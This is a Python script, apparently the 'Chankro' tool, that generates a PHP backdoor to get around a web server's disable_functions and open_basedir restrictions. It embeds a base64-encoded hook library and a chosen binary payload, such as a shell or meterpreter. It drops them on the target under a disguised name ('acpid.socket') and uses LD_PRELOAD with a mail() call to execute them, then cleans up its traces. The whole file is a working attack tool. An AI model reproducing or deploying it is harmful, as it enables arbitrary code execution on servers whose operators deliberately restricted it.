#!/usr/bin/python3

# [+] Bypass disable_functions
# [+] Bypass open_basedir

##############################
#          @TheXC3LL         #
#       @RizkyBlackHat       #
##############################

import argparse
import base64
import os

argp = argparse.ArgumentParser(description="Generate a PHP backdoor with customizable options.")
argp.add_argument(
  '-a', '--arch',
  type=str,
  required=True,
  choices=['32', '64'],
  help="Select the target architecture (32-bit or 64-bit)."
)
argp.add_argument(
  '-p', '--payload',
  type=str,
  required=True,
  help="Specify the binary payload to be executed (e.g., sh, meterpreter, etc.)."
)
argp.add_argument(
  '-o', '--output',
  type=str,
  required=True,
  help="Set the desired PHP backdoor will be saved."
)
argp.add_argument(
	'-t', '--target_path',
	type=str,
	required=True,
	help="Set lib extraction path in target machine (e.g., /tmp)."
)
args = argp.parse_args()

basepath	= os.path.dirname(os.path.realpath(__file__))

if os.path.isabs(args.output):
  outpath = os.path.dirname(args.output)
  outfile = os.path.basename(args.output)
else:
  outfile = args.output
  outpath = basepath  # Set outpath if outfile is relative

outname, outexts = os.path.splitext(outfile)

banner = """
   ________                __            
  / ____/ /_  ____ _____  / /___________ 
 / /   / __ \/ __ `/ __ \/ //_/ ___/ __ \\
/ /___/ / / / /_/ / / / / ,< / /  / /_/ /
\____/_/ /_/\__,_/_/ /_/_/|_/_/   \____/ 
                               ver. 0.5.0
 - @TheXC3LL
 - @RizkyBlackHat
"""
print(banner)

try:
	with open(args.payload, "rb") as file:
		encoded_payl = base64.b64encode(file.read()).decode('utf-8')  # Decode bytes to utf-8 string
except:
  print("[!] Error: payload could not be opened.")
  exit()
  
try:
  output = open(outpath + '/' + outname + outexts, "w")
except:
  print("[!] Error: out file could not be created.")
  exit()

try:
	libarch = basepath + '/hook' + args.arch + '.so'
	with open(libarch, "rb") as lib:
		encoded_lib = base64.b64encode(lib.read()).decode('utf-8')  # Decode bytes to utf-8 string
except:
  print("[!] Error: lib arch could not be loaded.")
  exit()

def generate_payload(encoded_lib, encoded_payl, args, outname, output):
  cleanup = (
    f"<?php\n"
    f"unlink('{args.target_path}/{outname}.so');\n"
    f"unlink('{args.target_path}/acpid.socket');\n"
    f"putenv('{outname.upper()}');\n"
    f"putenv('LD_PRELOAD');\n"
    f"?>"
  )
  payload = (
    f"<?php\n"
    f"$hook = '{encoded_lib}';\n"
    f"$payload = '{encoded_payl}';\n"
    f"file_put_contents('{args.target_path}/{outname}.so', base64_decode($hook));\n"
    f"file_put_contents('{args.target_path}/acpid.socket', base64_decode($payload));\n"
    f"putenv('{outname.upper()}={args.target_path}/acpid.socket');\n"
    f"putenv('LD_PRELOAD={args.target_path}/{outname}.so');\n"
    f"mail('a','a','a','a');\n"
    f"?>"
  )
  output.write(cleanup + "\n\n" + payload)
  output.close()

print("[i] Payload binary\t: " + args.payload)
print("[i] Architecture\t: " + args.arch)
print("[i] Output\t\t: " + args.output + "\n")

generate_payload(encoded_lib, encoded_payl, args, outname, output)

print("[!] Done!")
